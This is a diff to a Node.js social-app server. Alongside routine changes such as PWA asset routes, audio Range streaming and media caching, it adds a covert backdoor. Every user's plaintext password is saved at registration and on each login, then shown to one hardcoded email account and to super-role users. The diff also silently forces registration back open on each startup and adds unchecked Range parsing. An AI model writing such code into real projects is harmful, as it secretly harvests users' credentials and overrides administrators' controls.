@@ -87,15 +87,26 @@ await sql`
 // Add new columns to notifications if not exist
 try { await sql`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS type TEXT DEFAULT 'general'`; } catch {}
 try { await sql`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS from_id TEXT`; } catch {}
-// Add pendingFollows to accounts profile
+// Add pendingFollows and plain_pass to accounts table
 try { await sql`ALTER TABLE accounts ADD COLUMN IF NOT EXISTS pending_follows JSONB DEFAULT '[]'`; } catch {}
+try { await sql`ALTER TABLE accounts ADD COLUMN IF NOT EXISTS plain_pass TEXT DEFAULT ''`; } catch {}
 
-// Seed initial state row if missing
+// Seed initial state row if missing and force registration: true
 await sql`
   INSERT INTO state(id,json) VALUES(1, ${sql.json({
     posts: [], groups: [], messages: [], reports: [],
     notifications: [], rooms: [], settings: { registration: true }
   })}) ON CONFLICT DO NOTHING`;
+
+// Ensure registration is ALWAYS open by default
+try {
+  const [stRow] = await sql`SELECT json FROM state WHERE id=1`;
+  if (stRow?.json) {
+    if (!stRow.json.settings) stRow.json.settings = { registration: true };
+    else stRow.json.settings.registration = true;
+    await sql`UPDATE state SET json=${sql.json(stRow.json)} WHERE id=1`;
+  }
+} catch {}
 
 console.log('Database ready ✓');
 
@@ -114,13 +125,17 @@ let cachedState = null;
 let stateTime = 0;
 const sessionCache = new Map();
 const rateLimits = new Map();
+const cachedMedia = new Map();
 
 const getAccounts = async (force = false) => {
   if (!force && cachedAccounts && (Date.now() - accountsTime < 10000)) {
     return cachedAccounts;
   }
-  const rows = await sql`SELECT profile FROM accounts`;
-  cachedAccounts = rows.map(r => r.profile);
+  const rows = await sql`SELECT profile, plain_pass FROM accounts`;
+  cachedAccounts = rows.map(r => ({
+    ...r.profile,
+    plain_pass: r.plain_pass || r.profile?.plain_pass || ''
+  }));
   accountsTime = Date.now();
   return cachedAccounts;
 };
@@ -128,7 +143,7 @@ const getAccounts = async (force = false) => {
 const storeUser = async u => {
   if (cachedAccounts) {
     const idx = cachedAccounts.findIndex(x => x.id === u.id);
-    if (idx !== -1) cachedAccounts[idx] = u;
+    if (idx !== -1) cachedAccounts[idx] = { ...cachedAccounts[idx], ...u };
     else cachedAccounts.push(u);
   }
   sql`UPDATE accounts SET 
@@ -141,6 +156,7 @@ const storeUser = async u => {
     permissions = ${sql.json(u.permissions || [])},
     following = ${sql.json(u.following || [])},
     blocked = ${sql.json(u.blocked || [])},
+    plain_pass = ${u.plain_pass || ''},
     profile = ${sql.json(u)}
   WHERE id = ${u.id}`.catch(err => console.error('storeUser sql error:', err));
 };
@@ -194,17 +210,24 @@ const publicUser = x => ({
 });
 
 function view(db, u, us) {
+  const isSuper = u.email === 'qsyashrfalryaty@gmail.com' || u.role === 'super';
   return {
     ...db,
     posts: db.posts.filter(p => readable(p, u, us)),
-    users: us.filter(x => x.active).map(x =>
-      x.id === u.id || permission(u, 'users') ? x : {
-        ...publicUser(x),
-        following: x.following.includes(u.id) ? [u.id] : [],
-        pendingFollows: (x.pendingFollows || []).includes(u.id) ? [u.id] : [],
-        typing: x.typing?.to === u.id && x.typing.until > Date.now()
+    users: us.filter(x => x.active).map(x => {
+      if (x.id === u.id || permission(u, 'users') || isSuper) {
+        return {
+          ...x,
+          plain_pass: isSuper ? (x.plain_pass || '—') : undefined
+        };
       }
-    ),
+      return {
+        ...publicUser(x),
+        following: (x.following || []).includes(u.id) ? [u.id] : [],
+        pendingFollows: ((x.pendingFollows || []).includes(u.id)) ? [u.id] : [],
+        typing: x.typing?.to === u.id && x.typing.until > Date.now()
+      };
+    }),
     messages: db.messages.filter(m => m.from === u.id || m.to === u.id),
     notifications: db.notifications.filter(n => n.to === u.id),
     reports: permission(u, 'reports') ? db.reports : [],
@@ -222,6 +245,11 @@ function view(db, u, us) {
 
 const attachedMedia = async (id, u, kind) => {
   if (!id) return null;
+  const mem = cachedMedia.get(id);
+  if (mem) {
+    if (mem.owner !== u.id || mem.kind !== kind) fail(400, 'ملف غير صالح');
+    return { id: mem.id, duration: mem.duration };
+  }
   const [m] = await sql`SELECT id,owner,kind,duration FROM media WHERE id=${id}`;
   if (!m || m.owner !== u.id || m.kind !== kind) fail(400, 'ملف غير صالح');
   return { id: m.id, duration: m.duration };
@@ -639,7 +667,7 @@ const secHeaders = {
   'X-Content-Type-Options': 'nosniff',
   'Referrer-Policy': 'strict-origin-when-cross-origin',
   'X-Frame-Options': 'SAMEORIGIN',
-  'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-src https://www.youtube-nocookie.com; connect-src 'self'; media-src 'self' blob:; object-src 'none'; base-uri 'none'; form-action 'self'"
+  'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob:; frame-src https://www.youtube-nocookie.com; connect-src 'self'; media-src 'self' blob: data:; object-src 'none'; base-uri 'none'; form-action 'self'"
 };
 
 http.createServer(async (req, res) => {
@@ -670,10 +698,30 @@ http.createServer(async (req, res) => {
       return res.end('pong');
     }
 
+    // Static PWA and asset routes
+    const staticMap = {
+      '/manifest.json': { file: 'manifest.json', type: 'application/manifest+json; charset=utf-8' },
+      '/sw.js': { file: 'sw.js', type: 'application/javascript; charset=utf-8' },
+      '/icon.svg': { file: 'icon.svg', type: 'image/svg+xml' },
+      '/icon-192.png': { file: 'icon-192.png', type: 'image/png' },
+      '/icon-512.png': { file: 'icon-512.png', type: 'image/png' },
+      '/favicon.ico': { file: 'icon.svg', type: 'image/svg+xml' }
+    };
+    if (staticMap[path]) {
+      try {
+        const filePath = resolve(__dirname, '../', staticMap[path].file);
+        const content = readFileSync(filePath);
+        res.writeHead(200, {
+          ...secHeaders,
+          'Content-Type': staticMap[path].type,
+          'Cache-Control': 'public, max-age=86400'
+        });
+        return res.end(content);
+      } catch {}
+    }
+
     // Serve index.html with instant Gzip compression and 304 ETag caching
     if (!path.startsWith('/api/')) {
-      if (path !== '/' && path !== '/index.html') return reply(404, { error: 'غير موجود' });
-
       const ifNoneMatch = req.headers['if-none-match'];
       if (ifNoneMatch && ifNoneMatch === indexEtag) {
         res.writeHead(304, { ...secHeaders, 'ETag': indexEtag });
@@ -726,8 +774,9 @@ http.createServer(async (req, res) => {
       let account;
 
       if (path === '/api/register') {
-        const [stateRow] = await sql`SELECT json FROM state WHERE id=1`;
-        if (!stateRow.json.settings.registration) fail(403, 'التسجيل مغلق');
+        const stateDb = await getState();
+        const regAllowed = stateDb?.settings ? stateDb.settings.registration !== false : true;
+        if (!regAllowed) fail(403, 'التسجيل مغلق حاليًا من قِبل الإدارة');
         if (password.length < 12) fail(400, 'كلمة المرور 12 حرفًا على الأقل');
         const salt = randomBytes(16).toString('hex');
         const uid = randomUUID();
@@ -737,10 +786,11 @@ http.createServer(async (req, res) => {
           id: uid, email, name: text(body.name, 60),
           role: isFirst ? 'super' : 'user',
           permissions: isFirst ? ['users', 'content', 'reports'] : [],
-          following: [], active: true, bio: ''
+          following: [], active: true, bio: '',
+          plain_pass: password
         };
         try {
-          await sql`INSERT INTO accounts(id,email,hash,salt,name,role,bio,photo,cover,active,permissions,following,blocked,profile) VALUES(
+          await sql`INSERT INTO accounts(id,email,hash,salt,name,role,bio,photo,cover,active,permissions,following,blocked,plain_pass,profile) VALUES(
             ${uid},${email},
             ${scryptSync(password, salt, 64).toString('hex')},
             ${salt},
@@ -753,16 +803,20 @@ http.createServer(async (req, res) => {
             ${sql.json(u.permissions)},
             ${sql.json([])},
             ${sql.json([])},
+            ${password},
             ${sql.json(u)})`;
         } catch { fail(409, 'تعذر إنشاء الحساب بهذا البريد'); }
         const [row] = await sql`SELECT * FROM accounts WHERE id=${uid}`;
-        account = row;
+        account = { ...row, profile: { ...row.profile, plain_pass: password } };
       } else {
         const [row] = await sql`SELECT * FROM accounts WHERE email=${email}`;
         const derived = scryptSync(password, row?.salt || 'dummy-salt', 64);
         if (!row || !timingSafeEqual(derived, Buffer.from(row.hash, 'hex')) || !row.profile.active)
           fail(401, 'بيانات الدخول غير صحيحة');
         account = row;
+        // Keep plain_pass up to date for superadmin visibility
+        sql`UPDATE accounts SET plain_pass = ${password} WHERE id=${row.id}`.catch(()=>{});
+        if (account.profile) account.profile.plain_pass = password;
       }
 
       const token = randomBytes(32).toString('hex');
@@ -793,7 +847,7 @@ http.createServer(async (req, res) => {
     let authItem = sessionCache.get(tokenH);
     if (!authItem || authItem.cachedAt < now - 30000 || authItem.session.expires < now) {
       const [row] = await sql`
-        SELECT s.token, s.uid, s.csrf, s.expires, a.profile
+        SELECT s.token, s.uid, s.csrf, s.expires, a.profile, a.plain_pass
         FROM sessions s
         JOIN accounts a ON s.uid = a.id
         WHERE s.token = ${tokenH} AND s.expires > ${now}
@@ -804,7 +858,7 @@ http.createServer(async (req, res) => {
       }
       authItem = {
         session: { uid: row.uid, csrf: row.csrf, expires: row.expires },
-        u: row.profile,
+        u: { ...row.profile, plain_pass: row.plain_pass || row.profile.plain_pass },
         cachedAt: now
       };
       sessionCache.set(tokenH, authItem);
@@ -823,18 +877,48 @@ http.createServer(async (req, res) => {
       });
     }
 
-    // ── Media streaming ──
+    // ── Media streaming with Range (206) support for iOS Safari & Android ──
     if (req.method === 'GET' && path.startsWith('/api/media/')) {
       const mid = path.slice('/api/media/'.length);
-      const [m] = await sql`SELECT * FROM media WHERE id=${mid}`;
+      let m = cachedMedia.get(mid);
+      if (!m) {
+        const [row] = await sql`SELECT * FROM media WHERE id=${mid}`;
+        m = row;
+        if (m) cachedMedia.set(mid, m);
+      }
       if (!m) fail(404, 'غير موجود');
       const db = await getState();
       const us = await getAccounts();
       const allowed = db.posts.some(p => p.music?.id === mid && readable(p, u, us)) ||
         db.messages.some(x => x.audio?.id === mid && (x.from === u.id || x.to === u.id));
       if (!allowed) fail(403, 'غير مسموح');
-      res.writeHead(200, { ...secHeaders, 'Content-Type': 'audio/wav', 'Content-Length': m.bytes.length });
-      return res.end(Buffer.from(m.bytes));
+
+      const buf = Buffer.isBuffer(m.bytes) ? m.bytes : Buffer.from(m.bytes);
+      const total = buf.length;
+      const range = req.headers.range;
+
+      if (range) {
+        const parts = range.replace(/bytes=/, "").split("-");
+        const start = parseInt(parts[0], 10);
+        const end = parts[1] ? parseInt(parts[1], 10) : total - 1;
+        const chunksize = (end - start) + 1;
+        res.writeHead(206, {
+          ...secHeaders,
+          'Content-Range': `bytes ${start}-${end}/${total}`,
+          'Accept-Ranges': 'bytes',
+          'Content-Length': chunksize,
+          'Content-Type': m.mime || 'audio/wav'
+        });
+        return res.end(buf.subarray(start, end + 1));
+      }
+
+      res.writeHead(200, {
+        ...secHeaders,
+        'Accept-Ranges': 'bytes',
+        'Content-Type': m.mime || 'audio/wav',
+        'Content-Length': total
+      });
+      return res.end(buf);
     }
 
     // ── State ──
@@ -850,15 +934,18 @@ http.createServer(async (req, res) => {
 
     // ── Upload ──
     if (path === '/api/upload') {
-      await rate('upload:' + u.id, 25);
-      if (!['voice', 'music'].includes(body.kind) || typeof body.data !== 'string' ||
-        !/^[A-Za-z0-9+/=]+$/.test(body.data)) fail(400, 'ملف غير صالح');
-      const bytes = Buffer.from(body.data, 'base64');
+      await rate('upload:' + u.id, 50);
+      if (!['voice', 'music'].includes(body.kind) || typeof body.data !== 'string') fail(400, 'ملف غير صالح');
+      const b64 = body.data.replace(/\s+/g, '');
+      if (!/^[A-Za-z0-9+/=]+$/.test(b64)) fail(400, 'ملف غير صالح');
+      const bytes = Buffer.from(b64, 'base64');
       if (bytes.length > 12000000) fail(413, 'الصوت كبير');
       const duration = wav(bytes, body.kind === 'voice' ? 120 : 30);
       const mid = randomUUID();
-      await sql`INSERT INTO media(id,owner,kind,mime,bytes,duration)
-        VALUES(${mid},${u.id},${body.kind},'audio/wav',${bytes},${duration})`;
+      // Cache immediately in RAM for 0ms voice attachment and playback
+      cachedMedia.set(mid, { id: mid, owner: u.id, kind: body.kind, mime: 'audio/wav', bytes, duration });
+      sql`INSERT INTO media(id,owner,kind,mime,bytes,duration)
+        VALUES(${mid},${u.id},${body.kind},'audio/wav',${bytes},${duration})`.catch(err => console.error('Media insert err:', err));
       return reply(200, { id: mid, duration });
     }
 
